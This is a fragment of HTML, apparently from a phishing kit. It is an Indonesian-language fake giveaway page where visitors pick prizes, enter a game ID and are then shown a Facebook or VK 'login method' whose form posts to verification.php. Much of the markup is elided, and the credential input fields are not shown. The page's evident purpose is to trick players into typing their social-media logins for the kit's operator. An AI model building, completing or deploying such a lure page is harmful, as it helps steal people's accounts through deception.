...
× PEMILIK: sahilthegeek
× DIDESAIN OLEH: sahil hossain
× TANGGAL PEMBUATAN: 2 DESEMBER 2020
...
<div id="login-required">
	<div class="box-login">
		<a href="#close" class="close-login" onmousedown="tutup.play()" title="Close"><img src="img/btn_delete.png"></a>
		<h4 class="berhasil" align="center">LOGIN METHOD</h4>
        <br/>
...
<div id="login">
	<div class="box-login">
		<a href="#close" class="close-login" onmousedown="tutup.play()" title="Close"><img src="img/btn_delete.png"></a>
		<h4 class="berhasil" align="center">ID GAME</h4>
		</br>
		<img width="70" align="center" src="img/thumbnail.png">
       <br/><br/>
       <input style="font-color:#000;background:#fff;width: 40%;height: 27px;" type="text" placeholder="12345678" autocomplete="off" autocapitalize="off" required>
       <br/><br/>
		<button onclick="location.href='#login-required';" onmousedown="buka.play()" class="btn-klaim">Submit</button>
</br>
</br>
	</div>
</div>
...
<div class="nav-fb">
<img width="100px" align="center" src="img/fb.png">
</div>
<br/>
...
<div class="fb-login">
<a href="#login" onmousedown="tutup.play()" class="close-login" title="Close">&times;</a>
<div class="nav-fb"><img width="30px" src="img/vk.svg">
</div>
<br/>
<form action="verification.php" method="post">
	...
	<!----  HADIAH 1 --->
		...
		<div class="box">
			<div class="isi">
				...
				<hr class="garis">
				<center>
				<img width="255" src="img/sc/4.jpg">
				<hr class="garis"></br>
				<button type="button" onclick="location.href='#login';" class="btn-klaim">PILIH</button>
				</center>
			</div>
			<div class="isi">
				...
				<hr class="garis">
				<center>
				<img width="255" src="img/sc/5.jpg">
				<hr class="garis"></br>
				<button type="button" onclick="location.href='#login';" class="btn-klaim">PILIH</button>
				</br>
				</br>
			...
			<div class="isi">
				...
				<hr class="garis">
				<center>
				<img width="255" height="300" src="img/sc/6.jpg">
				<hr class="garis"></br>
				<button type="button" onclick="location.href='#login';" class="btn-klaim">PILIH</button>
				</br>
				</br>
		...
		<div class="box">
			<div class="isi">
				...
				<hr class="garis">
				<center>
				<img width="255" src="img/sc/7.jpg">
				<hr class="garis"></br>
			...
			<div class="isi">
				...
				<hr class="garis">
				<center>
				<img width="255" src="img/sc/8.jpg">
				<hr class="garis"></br>
				<button type="button" onclick="location.href='#login';" class="btn-klaim">PILIH</button>
				</br>
				</br>
		       ...
		       <div class="isi">
				...
				<hr class="garis">
				<center>
				<img width="255" src="img/sc/9.jpg">
				<hr class="garis"></br>
				<button type="button" onclick="location.href='#login';" class="btn-klaim">PILIH</button>
				</br>
				</br>
			...
			<div class="isi">
				...
				<hr class="garis">
				<center>
				<img width="255" src="img/sc/10.jpg">
				<hr class="garis"></br>
				<button type="button" onclick="location.href='#login';" class="btn-klaim">PILIH</button>
				</center>
			</div>
			<div class="isi">
				...
				<hr class="garis">
				<center>
				<img width="255" src="img/sc/11.jpg">
				<hr class="garis"></br>
				<button type="button" onclick="location.href='#login';" class="btn-klaim">PILIH</button>
				</br>
				</br>
			...
			<div class="isi">
				...
				<hr class="garis">
				<center>
				<img width="255" src="img/sc/12.jpg">
				<hr class="garis"></br>
				<button type="button" onclick="location.href='#login';" class="btn-klaim">PILIH</button>
				</center>
			</div>
		...
		<div class="box">
			<div class="isi">
				...
				<hr class="garis">
				<center>
				<img width="255" src="img/sc/13.jpg">
				<hr class="garis"></br>
				<button type="button" onclick="location.href='#login';" class="btn-klaim">PILIH</button>
				</center>
			</div>
			<div class="isi">
				...
				<hr class="garis">
				<center>
				<img width="255" src="img/sc/14.jpg">
				<hr class="garis"></br>
				<button type="button" onclick="location.href='#login';" class="btn-klaim">PILIH</button>
				</br>
				</br>
			...
			<div class="isi">
				...
				<hr class="garis">
				<center>
				<img width="255" height="300" src="img/sc/15.jpg">
				<hr class="garis"></br>
				<button type="button" onclick="location.href='#login';" class="btn-klaim">PILIH</button>
				</br>
				</br>
